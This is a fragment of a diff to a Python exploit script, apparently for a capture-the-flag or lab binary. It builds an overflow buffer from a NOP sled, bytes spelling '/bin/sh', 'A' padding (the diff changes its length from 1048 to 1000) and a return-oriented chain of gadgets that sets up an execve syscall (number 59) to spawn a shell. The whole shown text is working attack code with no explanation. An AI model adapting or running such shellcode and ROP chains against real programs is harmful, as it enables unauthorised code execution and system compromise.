@@ -29,7 +29,7 @@ shellcode =''
 for i in range(1,35) :
     shellcode += '\x90'
 shellcode += '\x20\x1d\x2f\x62\x69\x6e\x2f\x73\x68\x20\x1d\x2c\x30'
-shellcode += 'A'*(1048)
+shellcode += 'A'*(1000)
 shellcode += struct.pack('<q', g1)#pop rax ; ret
 shellcode += struct.pack('<q', d1) #59
 shellcode += struct.pack('<q', g2)#pop rdx + rsi
